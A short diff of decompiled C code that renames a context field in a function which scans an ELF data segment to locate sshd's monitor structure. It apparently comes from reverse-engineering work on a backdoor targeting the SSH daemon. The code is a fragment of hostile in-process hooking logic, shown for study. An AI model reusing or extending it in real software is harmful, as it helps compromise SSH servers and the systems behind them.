@@ -36,7 +36,7 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   zero_seed = 0;
   secret_append_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
   if ((secret_append_ok != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
-    ctx->struct_monitor_ptr_address = (monitor **)0x0;
+    ctx->monitor_struct_slot = (monitor **)0x0;
     data_start = (u8 *)elf_get_data_segment(elf,&data_segment_size,FALSE);
     if (data_start != (u8 *)0x0) {
       vote_idx = 0;
@@ -97,7 +97,7 @@ LAB_00103f07:
         candidate_slot = candidate_slot + 1;
       } while (candidate_slot != 10);
       if ((4 < top_vote_count) && ((monitor **)monitor_candidates[winning_candidate_idx] != (monitor **)0x0)) {
-        ctx->struct_monitor_ptr_address = (monitor **)monitor_candidates[winning_candidate_idx];
+        ctx->monitor_struct_slot = (monitor **)monitor_candidates[winning_candidate_idx];
         return TRUE;
       }
     }
